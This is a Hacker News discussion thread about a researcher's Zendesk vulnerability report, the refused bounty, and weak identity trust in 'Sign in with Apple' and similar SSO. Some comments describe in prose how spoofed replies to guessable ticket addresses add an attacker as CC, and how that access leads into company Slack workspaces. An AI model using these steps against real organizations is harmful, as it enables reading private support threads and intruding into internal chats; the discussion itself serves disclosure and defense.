I doubt we were the first. That is presumably the reason they failed to pay out. The real issue is that non-directory SSO options like Sign in with Apple (SIWA) have been incorrectly implemented almost everywhere, including by Slack and other large companies we alerted in June. Non-directory SSO should not have equal trust vs. directory SSO. If you have a Google account and use Google SSO, Google can attest that you control that account. Same with Okta and Okta SSO. SIWA, GitHub Auth, etc are not doing this. They rely on a weaker proof, usually just control of email at a single point in time. SSO providers are not fungible, even if the email address is the same. You need to take this into account when designing your trust model. Most services do not. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [quacksilver](user?id=quacksilver) [89 days ago](item?id=41824797)   | [parent](#41819655) | [next](#41823195) [–]  I do web app testing and report a similar issue as a risk rather often to my clients. You can replace Google below with many other identity providers. Imagine Bob works at Example Inc. and has email address bob@example.com Bob can get a Google account with primary email address bob@example.com. He can legitimately pass verification. Bob then gets fired for fraud or sexual harassment or something else gross misconduct-y and leaves his employer on bad terms. Bob still has access to the Google account bob@example.com. It didn't get revoked when they fired him and locked his accounts on company systems. He can use the account indefinitely to get Google to attest for his identity. Example Inc. subscribes to several SaaS apps, that offer Google as an identity provider for SSO. The SaaS app validates that he can get a trusted provider to authenticate that he has an @example.com email address and adds him to the list of permitted users. Bob can use these SaaS apps years later and pull data from them despite having left the company on bad terms. This is bad. I think the only way for Example Inc. to stop this in the case of Google would be to create a workspace account and use the option to prove domain ownership and force accounts that are unmanaged to either become managed or change their address by a certain date. <https://support.google.com/a/answer/6178640?hl=en> Other providers may not even offer something like this, and it relies on Example Inc. seeking out the identity providers, which seems unreasonable. How do you stop your corporate users signing up for the hot new InstaTwitch gaming app or Grinderble dating service that you have never heard of and using that to authenticate to your sales CRM full of customer data? | | --- | --- | --- | | | |  |  | [laz](user?id=laz) [89 days ago](item?id=41826806)   | [root](#41819655) | [parent](#41824797) | [next](#41825234) [–]  You don't need full blown workspace, which costs money, you can set up "cloud identity free" and claim the domain. When you're setting it up, you can choose what to do with any existing accounts that are part of your domain: kick them out or merge them in. | | --- | --- | --- | | | |  |  | [pfooti](user?id=pfooti) [88 days ago](item?id=41832636)   | [root](#41819655) | [parent](#41826806) | [next](#41825234) [–]  This is the right answer for this problem. If you're not interested in being a paying workspace customer, get cloud identity free and verify your domain. You can then take over and/or kick out any consumer users in the domain. | | --- | --- | --- | | | |  |  | [rkharsan64](user?id=rkharsan64) [89 days ago](item?id=41825234)   | [root](#41819655) | [parent](#41824797) | [prev](#41826806) | [next](#41853790) [–]  Every time I've left an organization, they have swiftly deleted the company email address/revoked my access to it. I assume every reasonable organization will have processes in place to do this. I don't see this as a vulnerability: how is Google supposed to know that a person has left the company? You let them know by deleting the account. | | --- | --- | --- | | | |  |  | [birdgoose](user?id=birdgoose) [89 days ago](item?id=41825326)   | [root](#41819655) | [parent](#41825234) | [next](#41825714) [–]  In the above example, the Company doesn't have anything to do with the Google account that the user created themselves. I don't know if Google is the best example here. Apple might be a better one: 1. User's work email is user@company.com 2. User creates Apple ID using their work email. Their Apple ID is user@example.com 3. User gets fired and their company email is deleted 4. User can still sign in to the SaaS apps using SIWA and their "company" Apple ID It's worth noting that OAuth providers - like Apple - include information such as if they are authoratitive or not over a particular account. | | --- | --- | --- | | | |  |  | [zrobotics](user?id=zrobotics) [89 days ago](item?id=41825680)   | [root](#41819655) | [parent](#41825326) | [next](#41826221) [–]  In the above example, the normal flow to get a Google address user@company.com relies on setting DNS records for company.com, both to prove control of the domain as well as to route email to that domain. There may be an exploit/bypass I'm not seeing, but I legitimately don't see any way a user who has a legitimate user@company.com email address hosted somewhere besides Google workspace could then setup a user@company.com email address with Google. If there's a way to do this, I would greatly appreciate a link or brief explanation, as our process for employee termination/resignation does involve disabling in the Google admin portal and if we need to be more proactive I definitely want to know. | | --- | --- | --- | | | |  |  | [dantiberian](user?id=dantiberian) [89 days ago](item?id=41825771)   | [root](#41819655) | [parent](#41825680) | [next](#41836879) [–]  The issue here is that if company.com does not use Google Workspace and hasn't claimed company.com, then any employee can sign up for a "consumer" Google account using user@company.com. There are legitimate reasons for this, e.g. imagine an employee at a company that uses Office365 needing to set up an account for Google Adwords. | | --- | --- | --- | | | |  |  | [hennell](user?id=hennell) [88 days ago](item?id=41836879)   | [root](#41819655) | [parent](#41825680) | [prev](#41825771) | [next](#41826221) [–]  You can sign up for google with an existing email. So if example.com is all on MS365 that's where the admins control stuff. No google workspace at all, no DNS records or proof of domain to anyone but MS. So anyone with an example.com email can make a google account using that email as their login. Verify they have the email and that's their login. A common system for users who need to use google ads or analytics. But when the company disables 365 login the google account remains. And if you use something third party that offers a "Sign in with google" then assumes because you have a google account ending "example.com" you are verified as "example.com" you've got access even if that account is disabled. If you have the google admin portal this doesn't work as you're controlling it there. But signing up for Microsoft or Apple accounts with that google workspace address might have the same loophole. | | --- | --- | --- | | | |  |  | [urbandw311er](user?id=urbandw311er) [89 days ago](item?id=41826221)   | [root](#41819655) | [parent](#41825326) | [prev](#41825680) | [next](#41825714) [–]  The example states that the user works at Example Co and email is @example.com This is the confusion — it’s reasonable to assume that the email is not a personal address. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [89 days ago](item?id=41825714)   | [root](#41819655) | [parent](#41825234) | [prev](#41825326) | [next](#41826281) [–]  That removes you from their system. If I make a GitHub account using bob@example.com, GitHub doesn't get notified that I got fired from example.com, so I can keep using my GitHub bob@example.com account in places that ask GitHub if I'm Bob@example.com even though I don't have access to that email anymore. | | --- | --- | --- | | | |  |  | [fweimer](user?id=fweimer) [89 days ago](item?id=41826281)   | [root](#41819655) | [parent](#41825234) | [prev](#41825714) | [next](#41853790) [–]  This no longer happens for services that have accounts that follow a social media style. For such accounts, employees are expected their own accounts (presumably with followers, reputation etc.) and keep it after leaving the company. For real social media, this is probably fine, but I don't understand why we accept this model for Github and Gitlab (and Sourceware before that). Even from an employee perspective, it's not great because it makes it unclear who owns what. Especially with services like Github which have rules about how many accounts you can create for one person, and under what circumstances. I have no idea how this is supposed to work in practice for Github and Gitlab, where people gain access to non-public areas of those websites, but they are still expected to use their own accounts which they keep after leaving their employer. (The enterprise-managed Github accounts do not address this because they prevent public, upstream collaboration.) | | --- | --- | --- | | | |  |  | [wutwutwat](user?id=wutwutwat) [86 days ago](item?id=41853790)   | [root](#41819655) | [parent](#41824797) | [prev](#41825234) | [next](#41824967) [–]  This is why you store and match on the sso provider’s uuid, not on the email address. Emails are not a unique identifier and never have been. Someone can delete their email account and later someone else can sign up and claim the same email. Anyone matching on email addresses is doing it wrong. I’ve tried to argue this to management at companies I’ve worked at in the past, but most see my concern as paranoid. | | --- | --- | --- | | | |  |  | [hunter2\_](user?id=hunter2_) [89 days ago](item?id=41824967)   | [root](#41819655) | [parent](#41824797) | [prev](#41853790) | [next](#41837035) [–]  I wonder why Google would make an SSO assertion along the lines of "yes, this user Bob has email address bob@example.com" in the situation where example.com is not under a Workspace account. Such assertions ought to be made only for Workspace (and Google's own domains such as gmail.com, googlemail.com, etc.) since outside of that it's obsolete proof as you say, i.e. it's merely a username of a Google account which happens to look like an email address, and nothing more. | | --- | --- | --- | | | |  |  | [yread](user?id=yread) [89 days ago](item?id=41825584)   | [root](#41819655) | [parent](#41824967) | [next](#41837035) [–]  You can create a google account with an existing email [https://support.google.com/accounts/answer/176347?hl=en&co=G...](https://support.google.com/accounts/answer/176347?hl=en&co=GENIE.Platform%3DDesktop) | | --- | --- | --- | | | |  |  | [necovek](user?id=necovek) [89 days ago](item?id=41825667)   | [root](#41819655) | [parent](#41825584) | [next](#41837035) [–]  I read the GP's question as "why" would Google allow that in the first place? The reason is obvious: because a Google account gets you access to many a Google service without requiring you to open a Gmail account. However, the question still stands: why does Google allow authentication with a non-Gmail/Workspace account? Yes, it would be confusing since not all Google Accounts would be made the same, but this entire class of security issues would disappear. So it's the usual UX convenience vs security. Alternative "fix" that's both convenient and secure is to have every company use Google Apps on their domain ;-) | | --- | --- | --- | | | |  |  | [oliwary](user?id=oliwary) [88 days ago](item?id=41837035)   | [root](#41819655) | [parent](#41824797) | [prev](#41824967) | [next](#41828932) [–]  Perhaps the following could be a solution to this issue? Any OAuth provider should send a flag called "attest\_identity\_ownership" (false, true) as part of the uaht flow, which is set to true if the account is a workspace account or gmail (or the equivalent for other services), and false if the email is an outside email. Thus, the service handling the login could decide whether to trust the login or proceed otherwise, e.g. by telling the user to use a different OAuth service/internal mechanism where the identity is attested. | | --- | --- | --- | | | |  |  | [kccqzy](user?id=kccqzy) [89 days ago](item?id=41828932)   | [root](#41819655) | [parent](#41824797) | [prev](#41837035) | [next](#41823195) [–]  If anyone needs motivation of such unmanaged users, I actively use this feature. I have my own Google Workspace on my own domain. Years ago when I bought a Nest product I found that I couldn't use a Google Workspace account to access Nest. No problem, I create a consumer Google account under my Google Workspace domain. The email looks just like a Workspace account. And it doesn't need any additional Workspace licenses. (I no longer plan to buy any more Nest devices so I'll delete the account once my last Nest product stops working.) | | --- | --- | --- | | | |  |  | [austinkhale](user?id=austinkhale) [89 days ago](item?id=41823195)   | [parent](#41819655) | [prev](#41824797) | [next](#41820038) [–]  Presumably one of the PMs you’re referring to has posted this article for additional information. Feels like they’re doubling down on their initial position. [https://support.zendesk.com/hc/en-us/articles/8187090244506-...](https://support.zendesk.com/hc/en-us/articles/8187090244506-Email-user-verification-bug-bounty-report-retrospective) | | --- | --- | --- | | | |  |  | [8n4vidtmkvmk](user?id=8n4vidtmkvmk) [89 days ago](item?id=41823488)   | [root](#41819655) | [parent](#41823195) | [next](#41823974) [–]  > Although the researcher did initially submit the vulnerability through our established process, they violated key ethical principles by directly contacting third parties about their report prior to remediation. This was in violation of bug bounty terms of service, which are industry standard and intended to protect the white hat community while also supporting responsible disclosure. This breach of trust resulted in the forfeiture of their reward, as we maintain strict standards for responsible disclosure. Wow... there was no indication that they even intended on fixing the issue, what was Daniel hackermondev supposed to do? Disclosing this to the affected users probably was the most ethical thing to do. I don't think he posted the vulnerability publicly until after the fix. "Forfeiture of their award" -- they said multiple times that it didn't qualify, they had no intention of ever giving a reward. | | --- | --- | --- | | | |  |  | [imroot](user?id=imroot) [89 days ago](item?id=41823576)   | [root](#41819655) | [parent](#41823488) | [next](#41823585) [–]  As someone who manages a bug bounty program, this kind of pisses me off. For some of our bugs given on h1, we openly say, "Hey, we need to see a POC in order to get this to be triaged." We do not provide test accounts for H1 users, so, if they exploit someone's instance, we'll not only take the amount that the customer paid off of their renewal price, we'll also pay the bounty hunter. | | --- | --- | --- | | | |  |  | [richbell](user?id=richbell) [89 days ago](item?id=41823585)   | [root](#41819655) | [parent](#41823488) | [prev](#41823576) | [next](#41823515) [–]  Indeed, they never had any intention of awarding a bounty.

If this was "fixed" by Zendesk, they would have paid less than a few % from the 50k they actually made. Edit: to those downvoting, the fact of the matter is that Zendesk's maximum bounty is far lower than 50k; yet OP made 50k; meaning by definition the value of the vulnerability was at least 50k. | | --- | --- | --- | | | |  |  | [bornfreddy](user?id=bornfreddy) [89 days ago](item?id=41828728)   | [root](#41819655) | [parent](#41823515) | [next](#41825250) [–]  If anything, they are probably upset that they apparently lost some customers over this. That must (rightfully) hurt. But it's their own mistake - leaving a security bug unaddressed is asking for trouble. | | --- | --- | --- | | | |  |  | [martinsnow](user?id=martinsnow) [89 days ago](item?id=41825250)   | [root](#41819655) | [parent](#41823488) | [prev](#41823515) | [next](#41823974) [–]  What a moron | | --- | --- | --- | | | |  |  | [thekevan](user?id=thekevan) [89 days ago](item?id=41823974)   | [root](#41819655) | [parent](#41823195) | [prev](#41823488) | [next](#41826124) [–]  So when the researcher said it was a bug, they said, "No, it's fine. No bug bounty, sorry." THEN the researcher eventually goes public. Later, Zendesk announces the bug and the fix and says there will be no bug bounty because the researcher went public. Is that how it went? I mean if so, that's one way to save on bug bounties. | | --- | --- | --- | | | |  |  | [bigiain](user?id=bigiain) [89 days ago](item?id=41824963)   | [root](#41819655) | [parent](#41823974) | [next](#41823993) [–]  He didn't even "go public" as that term is normally used in bug disclosure. He didn't write it up and release and exploit when Zendesk told him it was out of scope and didn't give him any indication they considered it a problem or were planning a fix. Instead he reached out to affected companies in at least a semi private way, and those companies considered the bug serious enough to pay him 50k collectively and in at least some cases drop Zendesk altogether. I am 100% certain that every one of the companies that paid the researched would consider the way this was handled by that researched "the best alternative to HackerOne rules 'ethical disclosure' in the face of a vendor trying to cover up serious flaws". In an ideal world, in my opinion HackerOne should publicly revoke Zendesk's account for abusing the rules and rejecting obviously valid bug payouts. | | --- | --- | --- | | | |  |  | [fweimer](user?id=fweimer) [89 days ago](item?id=41826342)   | [root](#41819655) | [parent](#41824963) | [next](#41823993) [–]  Aren't such disputes about scope relatively common? Not sure what Hackerone can do about it. For example, most Hackerone customers exclude denial-of-service issues because they don't want people to encourage to bring down their services with various kinds of flooding attacks. That doesn't mean that the same Hackerone customers (or their customers) wouldn't care about a single HTTP request bring down service for everyone for a couple of minutes. Email authentication issues are similar, I think: obviously on-path attacks against unencrypted email have to be out of scope, but if things are badly implemented that off-path attacks somehow work, too, then that really has to be fixed. Of course, what you really shouldn't do as a Hackerone customer is using it as a complete replacement for your incoming security contact point. There are always going to be scope issues like that, or people unable to use Hackerone at all. | | --- | --- | --- | | | |  |  | [sumedh](user?id=sumedh) [89 days ago](item?id=41823993)   | [root](#41819655) | [parent](#41823974) | [prev](#41824963) | [next](#41829824) [–]  > THEN the researcher eventually goes public.

I'll note he did go to the effort of having the first stab at that sort of resolution, when he pushed back on HackerOne's inaccurate triage of the bug as an SPF/DKIM/DMARC email issue. He clearly understood the need for triage for programs like this, and that the HackerOne internal triage team didn't understand the actual problem, but again was rebuffed. | | --- | --- | --- | | | |  |  | [eloisant](user?id=eloisant) [89 days ago](item?id=41829824)   | [root](#41819655) | [parent](#41823974) | [prev](#41823993) | [next](#41826124) [–]  We have 2 conflicting sides of the story, who knows which one is bullshiting. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [87 days ago](item?id=41847639)   | [root](#41819655) | [parent](#41829824) | [next](#41833836) [–]  When in doubt, go with the side which has been forthcoming. Zendesk didn’t publish details and wrote their post misleadingly describing it as a supply chain problem sounding almost as if they were a victim rather than the supplier of the vulnerability.

Come on. This is amateur hour. The reputational damage that comes from "the company that goes on the offensive and doesn't pay out legitimate bounties" impacts the overall results you get from a bug bounty program. "Pissing off the hackers" is not a way to keep people reporting credible bugs to your service. I don't understand what this tries to accomplish. The problem is bad, botching the triage is bad, and the bounty is relatively cheap. I understand that this feels bad from an egg-on-face perspective, but I would much rather be told by a penetration tester about a bug in a third-party service provider than not be told at all just to respect a program's bug bounty policy. | | --- | --- | --- | | | |  |  | [teddyh](user?id=teddyh) [89 days ago](item?id=41826525)   | [root](#41819655) | [parent](#41824764) | [next](#41828130) [–]  > *"Pissing off the hackers" is not a way to keep people reporting credible bugs to your service.* That doesn’t matter if your goal with a bug bounty program is *not* to have people reporting bugs, but instead to have the company appear to care about security. If your only aim is to *appear* serious about security, it doesn’t matter what you actually do with any bug reports.

I think this thinking is a relic of Google's status as seemingly the last remaining email provider to automatically create a Gmail account when signing up for a Google account. So using Google SSO meant using your Gmail account, and so control of the email address was nessissary for control of the Google account. If you lose the email account, you lose the Google account*. This is not true anymore since you can sign up for a Google account with any email. Whereas you can (and I believe always could\*) create an apple ID with any old email address. \*Maybe this delinked situation only came about when they added the App Store to OS X, and figured they'd make less money if they require existing Mac users to get a new email account in order to buy programs in the manner which would grant them a cut. Apple has a list of all the email addresses for its sole IDs, but it doesn't control them, and having one deleted doesn't nessisarilly affect the other.*  Google and custom domain email have always been delinked from this perspective. You could create a Google account with a custom domain and then point the domain elsewhere or lose control of it, and you'd still retain conto of the account. Basically, the required example essentially theoretical at this point - maybe it works for employers at companies that also happen to provide SSO services. So if you work at Facebook, Google, Apple, or github and have a me@FGAG.etc.com email dress, and you signed into slack through the SSO that affiliated with your company and the company email, but later don't work there and you've had your work account access revoked, you won't be able to use that SSO to sign into slack. That's what they mean by directory control or whatever. In contrast, if you sign up to github with your work email account, unless it's a managed device managed by your work, your work doesn't actually control the account. They just vouched for your affiliation at sign up when you verified your email. So if you use a github SSO to sign up for a service that 'verifies' your work email address from github during the process, that won't change when you leave and the company revoked access to the email. Github SSO, in this case, isn't verifying you have an email account @company.com. They are verifying you once did, or at least once had, access to it. This is what they mean by the non-directory whatever. | | --- | --- | --- | | | |  |  | [lathiat](user?id=lathiat) [89 days ago](item?id=41824382)   | [root](#41819655) | [parent](#41824326) | [prev](#41828368) | [next](#41820675) [–]  I think what he means is, if you have an @gmail.com account via Google, that is pretty good proof of control. But if you have any other e-mail (e.g. a custom domain) via Google, it's not. Similar with Apple, if you were signing in with an @icloud.com, it's pretty good proof, but if you have an Apple ID with a third-party e-mail it's not proof of current control of that e-mail.

What's the threat here? Is it that: if a hacker gains temporary access to Bob's email bob@example.com, they can create an Apple account attached to it, and use that account to sign in with a service ABC, then that hacker gains access to Bob's private info in service ABC? But if the hacker already has email access, can't he just log into service ABC directly anyway? Also, is it impossible to have a Google account with a non-gmail address? The original poster seemed to be saying that Google \_is\_ a directory SSO and Apple \_is not\_ categorically. But if you can have a Google account without a Gmail-ran email account, wouldn't Google have the same vulnerability? | | --- | --- | --- | | | |  |  | [nodamage](user?id=nodamage) [88 days ago](item?id=41834651)   | [root](#41819655) | [parent](#41824472) | [next](#41824639) [–]  I think the most likely threat in this case is with ex-employees. If Bob has access to bob@example.com and creates an Apple account with it, then subsequently gets fired from example.com, they might delete his email address but his Apple account will still allow him to login to services using Sign in with Apple. (Because Apple only checks ownership of the email address when the Apple account is being created.)

And possibly to have blackhats to start looking more closely, since they now know both 1) that whitehats are likely to be focusing elsewhere leaving more available un-reviewed attack surface, and 2) that Zendesk appears to be the sort of company who'll ignore and/or hide known vulnerabilities, giving exploits a much longer effective working time. If "the bad guys" discovered this (or if it had been discovered by a less ethically developed 15 year old who'd boasted about it in some Discord or hacker channel) I wonder just how many companies would have had interlopers in their Slack channels harvesting social engineering intelligence or even passwords/secrets/API keys freely shared in Slack channels? And I wonder how many other widely (or even narrowly) used 3rd party SaaS platforms can be exploited via Zendesk in exactly the same way. Pretty much any service that uses the email domain to "prove" someone works for a particular company and then grants them some level of access based on that would be vulnerable to having ZenDesk leak email confirmations to anybody who knows this bug.

And later on the post says: "Despite fixing the issue, Zendesk ultimately chose not to award a bounty for my report. Their reasoning? I had broken HackerOne's disclosure guidelines by sharing the vulnerability with affected companies." The best care scenario as I see it is that Zendesk has a problem they need to fix with their H1 triage process and/or their in and out of scope rules there. And \_none\_ of that is the researcher's problem. The worst (and in my opinion most likely) scenario, is that Zendesk did get notified when the researcher asked H1 to escalate their badly triaged denial to Zendesk for review, and Zendesk chose to deny any bounty and tried to hide their vulnerability. > As an aside, I wonder if those bounties in general reflect the real value of those bugs. The economic damage could be way higher, given that people share logins in support tickets. I think it's way worse than that, since internal teams often share logins/secrets/API keys (and details of architecture and networking that a smart blackhat would \_love\_ to have access to) in thei supposedly "internal" Slack channels. I think the fact that non Zendesk "affected companies" paid out $50k sets that as the absolute lower bound of "the real value of those bugs. And it's \_obvious\_ that the researcher didn't contact \_every\_ vulnerable Slack-using organisation. I wonder how much more he could have made by disclosing this to 10 or 100 times as many Slack using organisations, and delaying/stalling revealing his exploit POC to Zendesk while that money kept rolling in? I'll be interested to see if HackerOne react to this, to avoid the next researcher going for this "second level" of bug bounty payouts by not bothering with H1 or the vulnerable company, and instead disclosing to companies affected by the vulnerability instead of the companies with the vulnerability? It's kinda well known that H1 buy bounties are relatively small, compared to the effort required to craft a tricky POC. But people disclose there anyway, presumably party out of ethical concerns and partly for the reputation boost. But now we know you can probably get an order of magnitude more money by approaching 3rd party affected companies instead of cheapskate or outright abusive companies with H1 bounties that they choose to downvalue and not pay out on. | | --- | --- | --- | | | |  |  | [mkagenius](user?id=mkagenius) [89 days ago](item?id=41825371)   | [root](#41819150) | [parent](#41819238) | [prev](#41825134) | [next](#41819913) [–]  Hackerone staffs are not that good.

When you stand up a bug bounty program you get a *ton* of "I opened developer tools, edited the js on your page, and now the page does something bad" submissions. "I can spoof some email headers and send an email to myself that looks like it is coming from you" isn't something I've specifically seen due to some weird details about my bounty program but it is something I would absolutely expect for many programs to see. So you need a mechanism to reject this stuff. But if that mechanism is just "triage says this is dumb" you get problems. People scream at you for having their nonsense bug rejected. People submit dozens of very slightly altered "bugs" to try to say "you rejected the last one for reason X but this one does Y." So you create a general policy: anything involving email spoofing is out of scope. So then a real bug ends up in front of the triage person. They are tired and busy and look at the report and see "oh this relies on email spoofing, close as out of scope." Sucks. I think that Zendesk's follow up here is crap. They shouldn't be criticizing the author for writing about this bug. But I do very much understand how things end up with a $0 payout for the initial report. | | --- | --- | --- | | | |  |  | [nightpool](user?id=nightpool) [3 months ago](item?id=41821511)   | [root](#41819150) | [parent](#41819913) | [prev](#41827516) | [next](#41820656) [–]  Right, but I would be really shocked if Zendesk's internal email handler was doing any SPF/DKIM/DMARC validation at all.

It's supposed to be reachable when things are broken. So it's not as easy as just reconfiguring incoming mail relays. You might need separate domains for extended validation, or a reliable (!) way to relay authentication results to those mail endpoints that need it.

(Of course, if you have ever recieved e-mail from an address @id.apple.com, you would see the selector name in the DKIM signature header, and could look up the corresponding DKIM record directly.

Bug bounties are taken seriously by at least some companies. Where I have worked, we received very useful reports, some very severe, via HackerOne. The company even ran special sessions where engineers and hackers were brought together to try to maximize the number of bugs found in a few week period. It resulted in more secure software at the end and a community of excited researchers trying to make some money and fame on our behalf. The root cause in this case seems to be that they couldn’t get by HackerOne’s triage process because Zendesk excluded email from being in scope. This seems more like incompetence than malice on both of their parts. Good that the researcher showed how foolish they were. | | --- | --- | --- | | | |  |  | [dgoldstein0](user?id=dgoldstein0) [3 months ago](item?id=41820819)   | [root](#41819179) | [parent](#41820554) | [next](#41822295) [–]  This feels like a case in the gray area. On the one hand, companies need to declare certain stuff out of scope - whether they know about it and are planning to work on it, or consider it acceptable risk, as the point for the company is to help them improve their security posture within the scope of the resources they have to run the bug bounty program. What's weird here is that the blog author found an email problem that wasn't really in that DKIM/SPF etc area, and Zendesk claimed that exemption covered it. Without a broader PoC to show how it could be weaponized, it's hard to say that Zendesk was egregiously wrong here - the person triaging just lacked the imagination to figure out that it would be a real problem. Hell, later in the write up we learn Zendesk does do spam filtering on the inbound emails, and so it's not crazy to think a security engineer reading the report may assume that stuff would cover their butts, when it failed miserably here. (A good Engineer would check that assumption though) That said putting my security hat on, I have to ask - who thought that sequential ticket ids in the reply-to email address were a good idea? they really ought to be using long random nonces; at which point the "guess the right id to become part of the support thread" falls apart. Classic enumeration+IDOR. So it sounds like there's still a potential for abuse here, if you can sneak stuff by their filters. | | --- | --- | --- | | | |  |  | [mmsc](user?id=mmsc) [3 months ago](item?id=41821482)   | [root](#41819179) | [parent](#41820819) | [next](#41821353) [–]  >Without a broader PoC to show how it could be weaponized, it's hard to say that Zendesk was egregiously wrong here The implications of being able to read arbitrary email contents from arbitrary domains' support (or otherwise) addresses are well known, and any competent security personnel in ZenDesk's security team should know this is exactly what can happen.

The triage system reads through a lot of reports - without clear impact, lots of vulnerabilities look like "just another bug". Notice that Zendesk took notice once mondev was able to escalate to an ATO[1]. That's impact, and that gets noticed!

But respectfully (residual frustration at zendesk might make me curt here) if their security triage team can't see how dangerous it is for an attacker to get access to an arbitrary thread on a their CLIENT's corporate email chains (in this world of email logins and SSO), then they have a big lapse in security culture, no? Yes, the researcher could have tee'd himself up better, but this says way more about zendesk than it does about the 15-year-old researcher. | | --- | --- | --- | | | |  |  | [XCabbage](user?id=XCabbage) [3 months ago](item?id=41821354)   | [parent](#41819293) | [prev](#41819349) | [next](#41820730) [–]  Unauthorized read access to private emails you were never legitimately CCed on already *is* impact.

I personally find it a waste of time to sink evenings into an exploit when they're going to fix the bug anyway if I simply tell them about the problem. They also know the system better than I do and can probably find a bigger impact anyway Of course, this is only a good strategy if you're just wanting to do a good deed and not counting on getting more than a thank you note, but Zendesk or Hackerone (whoever you want to blame here) didn't even accept the bug in the first place.

That's blackmail which is illegal and ethically dubious. White hat hackers do not require companies to pay them in exchange for not revealing a bug---the reveal of a bug only happens if a company *doesn't fix* that bug. Companies can be jerks and refuse to pay anything. That doesn't give you the right to blackmail them---you and other security researchers can just refuse to help them in the future. A refusal to fix the vulnerability is what happened in the original blogpost, so it was fair game for release since the company doesn't care. Hackers that don't care about ethics or legality won't bother blackmailing companies with vulnerabilities. They'll sell or use the vulnerability to steal more important data, and blackmail companies for millions of dollars in crypto. | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [3 months ago](item?id=41822256)   | [root](#41819315) | [parent](#41822059) | [next](#41830244) [–]  I don't think this is true. I'm not a lawyer and this is not legal advice, but I think it's hard to fit the elements of an extortion statute to a "threat" to disclose the results of technical research work you yourself did. Moreover, if a vendor is working with HackerOne, they've already implicitly consented to their norm of non-disclosure in exchange for payment. Further, in something like 15 years of bounty programs, I haven't heard of any cases like this having been filed --- and bounty researchers threaten to publish all the time. I also disagree that there's anything ethically dubious about it. | | --- | --- | --- | | | |  |  | [buzer](user?id=buzer) [89 days ago](item?id=41825809)   | [root](#41819315) | [parent](#41822256) | [next](#41830244) [–]  Depends on country as well. There was recently a case in Finland where a couple of people found issue in certain locks made by Abloy. They were offering to sell the details to Abloy and suggested that they could alternatively publish them in Youtube.

The security—as implemented by Fortune 500 customers??—of an org-wide security domain (i.e. what everyone in an org can see) depends on whether any of the supported OAuth providers can be tricked into provisioning an account with @targetorg.com? This architecture makes 0 sense to me. Even if an org has totally outsourced its identity and auth management to Google (is this possible?), presumably that would include controls over how new @targetorg.com identities are created on the Google end. No F500 companies are using Apple as an identity provider since they definitely don't sell such services. So why would an F500 company configure Slack to allow Apple OAuth & introduce this vulnerability? | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [3 months ago](item?id=41820140)   | [parent](#41819475) | [next](#41820080) [–]  If you're using Google for identity and authentication, you can definitely control who has an active account in your domain. There can be some lag time before disabling or removing someone truly disables all their downstream accesses, but that's largely outside Google's control. The only way to trick your way into getting a corporate domain email address is to socially engineer a domain admin. Tangentially, this does raise one of my big issues with using OAuth2 for single-sign-on though, which is that it really doesn't address the third-party authorization problem well. Ok, you're bob@example.com, Google has verified that, and example.com is our domain, so we're letting you into our app Foobar. Now what? The scopes you requested were for Google APIs only and have nothing to do with Foobar really. So now we need to implement an authorization system in Foobar that decides what bob@example.com can actually do. This part, and how to do it right, gets glossed over (at best!) by discussions on OAuth2. It also gets glossed over by product and security when they want things "SSO-enabled", which means development time doesn't get budgeted for it. Even just using groups to control coarse access levels requires integration with provider-specific APIs. OAuth2 is great for identity and authentication, but far too little attention has been paid to doing authorization right. | | --- | --- | --- | | | |  |  | [m11a](user?id=m11a) [89 days ago](item?id=41828051)   | [root](#41819475) | [parent](#41820140) | [next](#41821654) [–]  This comment makes the most sense to me in this thread. Further, IMO, sure it's a bug that one can say they control support@company.com. But IMO the real issue is lousy, permissive authorisation that gives access to *anything* simply by virtue of controlling a @company.com mail. Surely some HR/tech person, when an employee is being onboarded, should be enabling access to some core systems (probably by adding them to a group), and the default state for an account with no groups should be no access. In any large enough organisation, IME there's a lot of ways to get a @org.com email, and too many people/systems have the ability to create an email than a single centralised IT team. | | --- | --- | --- | | | |  |  | [pkaeding](user?id=pkaeding) [3 months ago](item?id=41821654)   | [root](#41819475) | [parent](#41820140) | [prev](#41828051) | [next](#41820080) [–]  You can also create a non-email Google account as Bob+external@example.com, as long as you can get email sent to bob@example.com (ie, while you are employed by Example, Inc). Then, you leave your job, but still have a google account associated with an example.com email. Depending on how the app checks the login response, they might mistakenly assume you are part of the example.com org. | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [88 days ago](item?id=41839015)   | [root](#41819475) | [parent](#41821654) | [next](#41820080) [–]  I'm pretty sure you cannot create a personal account for "bob+external@example.com", as Google both knows about plus-suffixes (didn't they create them?) and any domains already managed under Workspaces. They also, in my experience, seem to have some understanding of domains managed by Microsoft's cloud and perhaps other competitors as well. But even so, there's another mechanism, which is that when you create an OAuth2-enabled project in Google's console, you can specify that only known users in your domain are allowed to authenticate through it. This would lock out any personal account anyway. | | --- | --- | --- | | | |  |  | [autarch](user?id=autarch) [3 months ago](item?id=41820080)   | [parent](#41819475) | [prev](#41820140) | [next](#41819549) [–]  I'm pretty sure you can configure your corporate Slack to only allow authentication providers you choose.

Zendesk allows you to add a CC to any existing support ticket by sending a (spoofed) reply from the original requestor's email address to that ticket's Reply-To address and including a CC in the email. In some circumstances the Reply-To address is based on an auto-incrementing integer so it can be guessed. (Although this may not alway be the case: my email archives show some emails from Zendesk using the integer and other emails using a random alphanumeric string. It seems to vary by company so it might be some sort of configuration setting?) 2. Slack allows third-party domain-wide logins via Sign in with Apple without additional verification that the email belongs to a real person. Here the author of the article pretends to be support@company.com to Slack and Slack lets them into the company.com channel, despite the fact that support@company.com does not actually represent a real user and is only intended to be a receiving email address that forwards into Zendesk. (This sounds more like a configuration problem than anything else though.) | | --- | --- | --- | | | |  |  | [kidbomb](user?id=kidbomb) [89 days ago](item?id=41824284)   | [parent](#41821838) | [next](#41819426) [–]  IMHO the second problem goes deeper: Sign In with Apple is allowing you to "create an account"(author's words) on @company.com, which should not be supported in the firat place.

